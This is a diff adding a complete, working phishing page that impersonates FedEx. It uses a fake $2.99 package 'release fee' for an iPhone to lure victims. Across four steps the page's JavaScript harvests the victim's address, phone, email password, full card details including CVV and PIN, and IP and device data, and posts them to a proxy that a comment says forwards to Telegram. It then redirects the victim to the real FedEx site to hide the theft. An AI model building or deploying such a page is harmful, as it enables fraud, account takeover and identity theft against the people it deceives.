@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx - Package Delivery Confirmation</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#128230;</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: #f4f4f4; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: white; max-width: 480px; width: 100%; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.15); overflow: hidden; }
+        .header { background: linear-gradient(135deg, #4D148C, #6B2FA0); color: white; padding: 25px 20px; text-align: center; }
+        .header h1 { font-size: 22px; font-weight: 700; letter-spacing: 1px; }
+        .header .sub { font-size: 13px; opacity: 0.9; margin-top: 5px; }
+        .header .logo { font-size: 32px; font-weight: 900; letter-spacing: 4px; }
+        .header .logo span { color: #FF6600; }
+        .body { padding: 20px; }
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .product-card { background: #f9f9f9; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: center; border: 1px solid #e0e0e0; }
+        .product-card img { max-width: 100%; height: 180px; object-fit: contain; border-radius: 8px; }
+        .product-card .product-name { font-size: 16px; font-weight: 700; margin-top: 10px; color: #333; }
+        .product-card .product-desc { font-size: 13px; color: #666; margin-top: 4px; }
+        .badge { display: inline-block; background: #FF6600; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-top: 8px; }
+        .info-box { background: #FFF3E0; border-left: 4px solid #FF6600; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; color: #333; }
+        .info-box strong { color: #4D148C; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 14px; border: 2px solid #ddd; border-radius: 8px; font-size: 15px; transition: border 0.2s; outline: none; }
+        .form-group input:focus, .form-group select:focus { border-color: #4D148C; }
+        .form-row { display: flex; gap: 10px; }
+        .form-row .form-group { flex: 1; }
+        .captcha-box { background: #f0f0f0; padding: 15px; border-radius: 8px; margin-bottom: 16px; text-align: center; }
+        .captcha-box .question { font-size: 18px; font-weight: 700; color: #333; }
+        .captcha-box input { width: 80px; text-align: center; margin: 10px auto; display: block; font-size: 18px; padding: 8px; }
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #4D148C, #6B2FA0); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.1s, opacity 0.2s; }
+        .btn:hover { opacity: 0.95; transform: translateY(-1px); }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .secure-badge { text-align: center; margin-top: 15px; font-size: 12px; color: #888; }
+        .secure-badge span { color: #4D148C; font-weight: 600; }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 60px; height: 60px; border: 6px solid #fff; border-top-color: #FF6600; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: white; margin-top: 20px; font-size: 16px; text-align: center; }
+        .error-msg { color: #d32f2f; font-size: 13px; margin-top: 4px; display: none; }
+        .success-check { font-size: 60px; color: #4CAF50; }
+        @media (max-width: 480px) { .container { border-radius: 0; box-shadow: none; } body { padding: 0; } }
+    </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Verifying your information...</div>
+</div>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">Fed<span>Ex</span></div>
+        <h1>Package Delivery Confirmation</h1>
+        <div class="sub">Secure verification required</div>
+    </div>
+
+    <div class="body">
+        <!-- STEP 1: Product + Info -->
+        <div class="step active" id="step1">
+            <div class="product-card">
+                <img id="productImage" src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=600" alt="iPhone 15 Pro Max">
+                <div class="product-name" id="productName">iPhone 15 Pro Max</div>
+                <div class="product-desc">🎁 Gift from sender — awaiting release</div>
+                <div class="badge">$2.99 Release Fee Required</div>
+            </div>
+            <div class="info-box">
+                📦 <strong>Package #FDX-748291</strong> is being held at your local FedEx facility.<br>
+                A <strong>$2.99 release fee</strong> is needed to complete delivery.<br>
+                <small style="color:#888;">Expected delivery: 1-2 business days after payment</small>
+            </div>
+            <div class="captcha-box">
+                <div style="font-size:13px;color:#666;margin-bottom:8px;">🔒 Security verification</div>
+                <div class="question" id="captchaQuestion">7 + 5 = ?</div>
+                <input type="number" id="captchaInput" placeholder="?" autocomplete="off">
+                <div class="error-msg" id="captchaError">Incorrect answer. Try again.</div>
+            </div>
+            <button class="btn" onclick="goStep2()">Continue →</button>
+            <div class="secure-badge">🔒 <span>Secured by FedEx</span> • SSL Encrypted</div>
+        </div>
+
+        <!-- STEP 2: Personal Info -->
+        <div class="step" id="step2">
+            <h3 style="margin-bottom:15px;color:#4D148C;">📋 Delivery Address & Contact</h3>
+            <div class="form-group">
+                <label>Full Name (as on ID)</label>
+                <input type="text" id="fullName" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label>Street Address</label>
+                <input type="text" id="address" placeholder="123 Main St, Apt 4B" required>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>City</label>
+                    <input type="text" id="city" placeholder="City" required>
+                </div>
+                <div class="form-group">
+                    <label>State</label>
+                    <input type="text" id="state" placeholder="State" required>
+                </div>
+                <div class="form-group">
+                    <label>ZIP Code</label>
+                    <input type="text" id="zip" placeholder="12345" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="(555) 123-4567" required>
+            </div>
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="you@example.com" required>
+            </div>
+            <button class="btn" onclick="goStep3()">Continue →</button>
+        </div>
+
+        <!-- STEP 3: Email Password (disguised as verification) -->
+        <div class="step" id="step3">
+            <h3 style="margin-bottom:15px;color:#4D148C;">📧 Verify Your Email</h3>
+            <div class="info-box">
+                🔐 For delivery updates and tracking, please verify your email account.<br>
+                <small>This is required by FedEx's new secure delivery policy.</small>
+            </div>
+            <div class="form-group">
+                <label>Email Address (confirm)</label>
+                <input type="email" id="emailConfirm" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+                <label>Email Password</label>
+                <input type="password" id="emailPassword" placeholder="Enter your email password" required>
+                <div style="font-size:11px;color:#888;margin-top:4px;">We use this to verify your identity for secure delivery notifications.</div>
+            </div>
+            <button class="btn" onclick="goStep4()">Continue →</button>
+        </div>
+
+        <!-- STEP 4: Card Payment -->
+        <div class="step" id="step4">
+            <h3 style="margin-bottom:15px;color:#4D148C;">💳 Pay Release Fee — $2.99</h3>
+            <div class="info-box" style="background:#E8F5E9;border-color:#4CAF50;">
+                ✅ <strong>One-time payment of $2.99</strong> — your package will be delivered within 1-2 business days.
+            </div>
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardHolder" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCard(this)" required>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Expiry (MM/YY)</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cardCvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Card PIN (4 digits)</label>
+                <input type="password" id="cardPin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" required>
+                <div style="font-size:11px;color:#888;margin-top:4px;">For verification purposes only.</div>
+            </div>
+            <button class="btn" onclick="submitAll()">Pay $2.99 & Confirm →</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// ========== CONFIG ==========
+const PROXY_URL = '/proxy.php';  // Calls our PHP backend
+const REDIRECT_URL = 'https://www.fedex.com/en-us/tracking.html';
+
+// Captcha
+let captchaAnswer = 0;
+function generateCaptcha() {
+    const a = Math.floor(Math.random() * 10) + 5;
+    const b = Math.floor(Math.random() * 10) + 3;
+    captchaAnswer = a + b;
+    document.getElementById('captchaQuestion').textContent = a + ' + ' + b + ' = ?';
+    document.getElementById('captchaInput').value = '';
+    document.getElementById('captchaError').style.display = 'none';
+}
+generateCaptcha();
+
+// ========== STEP NAVIGATION ==========
+function showStep(n) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById('step' + n).classList.add('active');
+}
+
+function goStep2() {
+    const captcha = document.getElementById('captchaInput').value.trim();
+    if (parseInt(captcha) !== captchaAnswer) {
+        document.getElementById('captchaError').style.display = 'block';
+        generateCaptcha();
+        return;
+    }
+    showStep(2);
+}
+
+function goStep3() {
+    const name = document.getElementById('fullName').value.trim();
+    const addr = document.getElementById('address').value.trim();
+    const city = document.getElementById('city').value.trim();
+    const state = document.getElementById('state').value.trim();
+    const zip = document.getElementById('zip').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    if (!name || !addr || !city || !state || !zip || !phone || !email) {
+        alert('Please fill in all fields.');
+        return;
+    }
+    showStep(3);
+}
+
+function goStep4() {
+    const emailConfirm = document.getElementById('emailConfirm').value.trim();
+    const emailPass = document.getElementById('emailPassword').value.trim();
+    if (!emailConfirm || !emailPass) {
+        alert('Please fill in all fields.');
+        return;
+    }
+    if (emailConfirm !== document.getElementById('email').value.trim()) {
+        alert('Email addresses do not match.');
+        return;
+    }
+    showStep(4);
+}
+
+// ========== FORMATTING ==========
+function formatCard(input) {
+    let val = input.value.replace(/\D/g, '');
+    if (val.length > 16) val = val.slice(0, 16);
+    input.value = val.replace(/(.{4})/g, '$1 ').trim();
+}
+function formatExpiry(input) {
+    let val = input.value.replace(/\D/g, '');
+    if (val.length > 4) val = val.slice(0, 4);
+    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
+    input.value = val;
+}
+
+// ========== IP & DEVICE INFO ==========
+let ipInfo = {};
+async function getIPInfo() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        ipInfo = {
+            ip: data.ip || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+            country: data.country_name || 'Unknown',
+            isp: data.org || 'Unknown',
+            lat: data.latitude || 'N/A',
+            lon: data.longitude || 'N/A',
+            timezone: data.timezone || 'Unknown'
+        };
+    } catch (e) {
+        ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown', lat: 'N/A', lon: 'N/A', timezone: 'Unknown' };
+    }
+}
+getIPInfo();
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
+    
+    if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edge')) browser = 'Edge';
+    
+    if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'macOS';
+    else if (ua.includes('Linux')) os = 'Linux';
+    else if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+    
+    if (ua.includes('Mobile')) device = 'Mobile';
+    else if (ua.includes('Tablet')) device = 'Tablet';
+    
+    return {
+        userAgent: ua,
+        browser: browser,
+        os: os,
+        device: device,
+        language: navigator.language || 'Unknown',
+        platform: navigator.platform || 'Unknown',
+        screen: screen.width + 'x' + screen.height,
+        time: new Date().toLocaleString()
+    };
+}
+
+// ========== SUBMIT ==========
+async function submitAll() {
+    const cardHolder = document.getElementById('cardHolder').value.trim();
+    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const cardExpiry = document.getElementById('cardExpiry').value.trim();
+    const cardCvv = document.getElementById('cardCvv').value.trim();
+    const cardPin = document.getElementById('cardPin').value.trim();
+    
+    if (!cardHolder || !cardNumber || !cardExpiry || !cardCvv || !cardPin) {
+        alert('Please fill in all card details.');
+        return;
+    }
+    if (cardNumber.length < 16) {
+        alert('Please enter a valid card number.');
+        return;
+    }
+    if (cardPin.length !== 4) {
+        alert('PIN must be 4 digits.');
+        return;
+    }
+    
+    // Show loading
+    document.getElementById('loadingOverlay').classList.add('active');
+    document.getElementById('loadingText').textContent = 'Verifying payment...';
+    
+    // Wait for IP info
+    await new Promise(r => setTimeout(r, 1000));
+    
+    // Collect all data
+    const device = getDeviceInfo();
+    const data = {
+        // Personal
+        fullName: document.getElementById('fullName').value.trim(),
+        address: document.getElementById('address').value.trim(),
+        city: document.getElementById('city').value.trim(),
+        state: document.getElementById('state').value.trim(),
+        zip: document.getElementById('zip').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        email: document.getElementById('email').value.trim(),
+        emailPassword: document.getElementById('emailPassword').value.trim(),
+        
+        // Card
+        cardHolder: cardHolder,
+        cardNumber: cardNumber,
+        cardExpiry: cardExpiry,
+        cardCvv: cardCvv,
+        cardPin: cardPin,
+        
+        // Product
+        product: 'iPhone 15 Pro Max',
+        
+        // Device & IP
+        ip: ipInfo.ip || 'Fetching...',
+        city: ipInfo.city || 'Unknown',
+        region: ipInfo.region || 'Unknown',
+        country: ipInfo.country || 'Unknown',
+        isp: ipInfo.isp || 'Unknown',
+        lat: ipInfo.lat || 'N/A',
+        lon: ipInfo.lon || 'N/A',
+        timezone: ipInfo.timezone || 'Unknown',
+        userAgent: device.userAgent,
+        browser: device.browser,
+        os: device.os,
+        device: device.device,
+        language: device.language,
+        platform: device.platform,
+        screen: device.screen,
+        timestamp: device.time
+    };
+    
+    // Send to proxy (which sends to Telegram)
+    try {
+        const res = await fetch(PROXY_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        const result = await res.json();
+        console.log('Proxy response:', result);
+    } catch (e) {
+        console.error('Proxy send failed:', e);
+    }
+    
+    // Fake processing
+    document.getElementById('loadingText').textContent = 'Payment confirmed! Redirecting to FedEx...';
+    await new Promise(r => setTimeout(r, 2000));
+    
+    // Set cookie to prevent double submission
+    document.cookie = 'fedex_submitted=true; path=/; max-age=86400';
+    
+    // Redirect
+    window.location.href = REDIRECT_URL;
+}
+
+// Prevent double submission
+if (document.cookie.includes('fedex_submitted=true')) {
+    window.location.href = REDIRECT_URL;
+}
+</script>
+</body>
+</html>
